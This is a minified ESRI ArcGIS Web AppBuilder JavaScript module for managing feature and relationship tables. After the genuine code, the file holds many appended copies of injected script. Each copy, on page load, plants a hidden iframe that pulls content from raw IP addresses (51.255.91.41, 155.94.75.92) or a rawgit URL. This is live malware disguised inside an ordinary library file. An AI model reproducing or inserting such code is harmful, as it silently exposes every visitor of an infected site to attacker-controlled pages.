// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/promise/all esri/lang jimu/portalUrlUtils ./table/_FeatureTable ./utils".split(" "),function(r,g,l,m,t,n,q,u,p){return r(null,{_activeLayerInfoId:null,_activeRelationshipKey:null,nls:null,config:null,map:null,_delayedLayerInfos:[],_layerInfosFromMap:[],featureTableSet:{},relationshipsSet:{},relationshipTableSet:{},currentRelationshipKey:null,constructor:function(a){this.map=a&&a.map;this.nls=a&&a.nls;this._delayedLayerInfos=
[];this._layerInfosFromMap=[];this.featureTableSet={};this.relationshipsSet={};this.relationshipTableSet={};this.currentRelationshipKey=null},setConfig:function(a){this.config=g.clone(a||{})},setMap:function(a){this.map=a},updateLayerInfoResources:function(a){var b=new m;p.readConfigLayerInfosFromMap(this.map,!1,!0).then(g.hitch(this,function(d){this._layerInfosFromMap=d;this._processDelayedLayerInfos();a&&(0===this.config.layerInfos.length?(d=p.getConfigInfosFromLayerInfos(d),this.config.layerInfos=
l.filter(d,function(a){return a.show})):this.config.layerInfos=l.filter(g.delegate(this.config.layerInfos),g.hitch(this,function(a){var b=this._getLayerInfoById(a.id);return a.show&&b&&(a.name=b.name||b.title)})));b.resolve()}),function(a){b.reject(a)});return b},isEmpty:function(){return this.config&&this.config.layerInfos&&0>=this.config.layerInfos.length},getConfigInfos:function(){return g.clone(this.config.layerInfos)},addLayerInfo:function(a){0===this._layerInfosFromMap.length?this._delayedLayerInfos.push(a):
0<this._layerInfosFromMap.length&&!this._getLayerInfoById(a.id)&&this._layerInfosFromMap.push(a)},addConfigInfo:function(a){this._getConfigInfoById(a.id)||(a=p.getConfigInfoFromLayerInfo(a),this.config.layerInfos.push({id:a.id,name:a.name,layer:{url:a.layer.url,fields:a.layer.fields}}))},removeLayerInfo:function(a){a=this._getLayerInfoById(a);a=this._layerInfosFromMap.indexOf(a);this._layerInfosFromMap.splice(a,1)},removeConfigInfo:function(a){if(g.getObject("config.layerInfos",!1,this))for(var b=
this.config.layerInfos.length,d=0;d<b;d++)if(this.config.layerInfos[d].id===a){this.featureTableSet[a]&&(this.featureTableSet[a].destroy(),delete this.featureTableSet[a]);this.config.layerInfos.splice(d,1);break}},getQueryTable:function(a,b,d){var c=new m;this._activeLayerInfoId=a;this.featureTableSet[a]?c.resolve({isSupportQuery:!0,table:this.featureTableSet[a]}):this._getQueryTableInfo(a).then(g.hitch(this,function(f){if(f){var e=f.layerInfo,k=f.layerObject;f=f.tableInfo;if(this.featureTableSet[a])c.resolve({isSupportQuery:f.isSupportQuery,
table:this.featureTableSet[a]});else if(g.getObject("isSupportQuery",!1,f)){var h=this._getConfigInfoById(a);h||(this.addConfigInfo(e),h=this._getConfigInfoById(a));var v=g.getObject("layer.fields",!1,h);h.layer.fields=this._clipValidFields(v,k&&k.fields);e=new u({map:this.map,matchingMap:b,hideExportButton:d,layerInfo:e,configedInfo:h,nls:this.nls});this.featureTableSet[a]=e;c.resolve({isSupportQuery:f.isSupportQuery,table:e})}else c.resolve({isSupportQuery:!1})}else c.resolve(null)}),function(a){c.reject(a)});
return c},getRelationTable:function(a,b,d,c){var f=new m,e=this.relationshipsSet[b];this._activeRelationshipKey=b;if(e){var k=this._getLayerInfoById(a);a=g.getObject("shipInfo.id",!1,e);this.getQueryTable(a,d,c).then(g.hitch(this,function(a){if(a&&a.table){var b=a.table;b.set("relatedOriginalInfo",k);b.set("relationship",e)}f.resolve(a)}),g.hitch(function(){f.resolve(null)}))}else f.resolve(null);return f},removeRelationTable:function(a){this.relationshipTableSet[a]&&(this.relationshipTableSet[a].destroy(),
this.relationshipTableSet[a]=null)},getCurrentTable:function(a){return this.featureTableSet[a]||this.relationshipTableSet[a]},collectRelationShips:function(a,b){this._collectRelationShips(a,a.layerObject,b)},getConfigInfoById:function(a){return this._getConfigInfoById(a)},getLayerInfoById:function(a){return this._getLayerInfoById(a)},getRelationshipsByInfoId:function(a){var b=[],d;for(d in this.relationshipsSet){var c=this.relationshipsSet[d];c._layerInfoId===a&&b.push(c)}return b},empty:function(){this._delayedLayerInfos=
[];this._layerInfosFromMap=[];this.featureTableSet={};for(var a in this.relationshipsSet)this.relationshipsSet[a].shipInfo=null;this.relationshipsSet={};this.relationshipTableSet={};this.nls=this.map=this.config=this.currentRelationshipKey=null},_processDelayedLayerInfos:function(){0<this._delayedLayerInfos.length&&(l.forEach(this._delayedLayerInfos,g.hitch(this,function(a){!this._getLayerInfoById(a&&a.id)&&this.map&&this.map.getLayer(a.id)&&this._layerInfosFromMap.push(a)})),this._delayedLayerInfos=
[])},_getLayerInfoById:function(a){for(var b=0,d=this._layerInfosFromMap.length;b<d;b++)if(this._layerInfosFromMap[b]&&this._layerInfosFromMap[b].id===a)return this._layerInfosFromMap[b]},_getConfigInfoById:function(a){if(!g.getObject("layerInfos.length",!1,this.config))return null;for(var b=0,d=this.config.layerInfos.length;b<d;b++){var c=this.config.layerInfos[b];if(c&&c.id===a)return c}return null},_getQueryTableInfo:function(a){var b=new m,d=this._getLayerInfoById(a);if(d){var c=[],f=d.getUrl();
c.push(d.getLayerObject());c.push(d.getSupportTableInfo());f&&c.push(d.getRelatedTableInfoArray());t(c).then(g.hitch(this,function(e){if(this._activeLayerInfoId===a&&e){var c=e[0],g=e[1];e=f?e[2]:[];n.isDefined(e)&&n.isDefined(c)&&0<e.length&&this._collectRelationShips(d,c,e);b.resolve({layerInfo:d,layerObject:c,tableInfo:g})}else b.resolve(null)}),function(a){b.reject(a)})}else console.error("no activeLayerInfo!"),b.reject(Error());return b},_collectRelationShips:function(a,b,d){var c=b.relationships;
if(c&&0<c.length&&b&&b.url){var f=b.url.split("/");l.forEach(c,g.hitch(this,function(c){f[f.length-1]=c.relatedTableId;var e=f.join("/"),h=l.filter(d,g.hitch(this,function(a){a=a.getUrl();return n.isDefined(a)&&n.isDefined(e)&&q.removeProtocol(a.toString().toLowerCase())===q.removeProtocol(e.toString().toLowerCase())}));h&&0<h.length&&(c.shipInfo=h[0]);h=a.id+"_"+c.name+"_"+c.id;c._relKey=h;c._layerInfoId=a.id;this.relationshipsSet[h]||(this.relationshipsSet[h]=c,this.relationshipsSet[h].objectIdField=
b.objectIdField)}))}},_getLayerInfoLabel:function(a){return a.name||a.title},_getLayerInfoId:function(a){return a&&a.id||""},_clipValidFields:function(a,b){if(!a||!a.length)return b||[];if(!b||!b.length)return a;for(var d=[],c=0,f=a.length;c<f;c++)for(var e=a[c],k=0,h=b.length;k<h;k++)if(b[k].name===e.name){d.push(e);break}0===d.length&&0<a.length&&(a=g.clone(b),l.forEach(a,g.hitch(this,function(a){"esriFieldTypeGeometry"!==a.type&&(a.show=!0,d.push(a))})));return d}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});